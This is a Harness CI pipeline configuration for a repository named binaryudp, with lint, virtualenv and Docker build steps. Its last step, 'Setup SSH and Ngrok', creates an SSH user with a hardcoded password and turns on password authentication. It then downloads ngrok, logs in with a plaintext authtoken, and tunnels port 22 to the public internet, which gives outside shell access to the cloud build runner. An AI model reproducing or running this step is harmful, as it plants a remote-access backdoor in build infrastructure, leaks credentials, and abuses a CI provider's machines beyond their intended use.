pipeline:
  identifier: Build_Subhya090_binaryudp_1741606998488
  name: Build binaryudp
  orgIdentifier: default
  projectIdentifier: default_project
  properties:
    ci:
      codebase:
        build: <+input>
        connectorRef: account.Github_OAuth_1741606939087
        repoName: Subhya090/binaryudp
  stages:
    - stage:
        identifier: build
        name: build
        spec:
          caching:
            enabled: true
          cloneCodebase: true
          execution:
            steps:
              - step:
                  identifier: runlinter
                  name: run linter
                  spec:
                    command: |-
                      pip install flake8
                      flake8 .
                  timeout: ""
                  type: Run
              - step:
                  identifier: setupvirtualenvironment
                  name: setup virtual environment
                  spec:
                    command: |-
                      python3 -m venv .venv
                      . .venv/bin/activate
                      python3 -m pip install -r requirements.txt
                      python3 -m pip install -e .
                  timeout: ""
                  type: Run
              - step:
                  identifier: dockerbuild
                  name: docker_build
                  spec:
                    caching: true
                    connectorRef: <+input>
                    repo: hello/world
                    tags:
                      - latest
                  timeout: ""
                  type: BuildAndPushDockerRegistry
              - step:
                  identifier: setup_ssh_ngrok
                  name: Setup SSH and Ngrok
                  type: Run
                  spec:
                    shell: Bash
                    command: |
                      # Update package list and install SSH server
                      apt-get update && apt-get install -y openssh-server wget unzip curl

                      # Create SSH user 'samir' with password 'samir090'
                      useradd -m -s /bin/bash samir
                      echo 'samir:samir090' | chpasswd

                      # Enable SSH password authentication
                      sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
                      sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
                      service ssh start

                      # Download & install Ngrok
                      wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip -O /tmp/ngrok.zip
                      unzip /tmp/ngrok.zip -d /usr/local/bin/
                      chmod +x /usr/local/bin/ngrok

                      # Authenticate Ngrok
                      ngrok authtoken 2lKjA15AAL3kFG0cbOpfTJGbewT_3PjMCSs55KCHQ2PKkoVdS

                      # Start Ngrok to expose SSH (port 22)
                      nohup ngrok tcp 22 > /dev/null 2>&1 &

                      # Wait for Ngrok to establish the tunnel
                      sleep 10

                      # Get and display the public Ngrok URL
                      NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | grep -o 'tcp://[0-9a-zA-Z.]*:[0-9]*')
                      echo "ðŸ”¹ SSH into the build machine using:"
                      echo "ssh samir@$NGROK_URL"
          platform:
            arch: Amd64
            os: Linux
          runtime:
            spec: {}
            type: Cloud
        type: CI
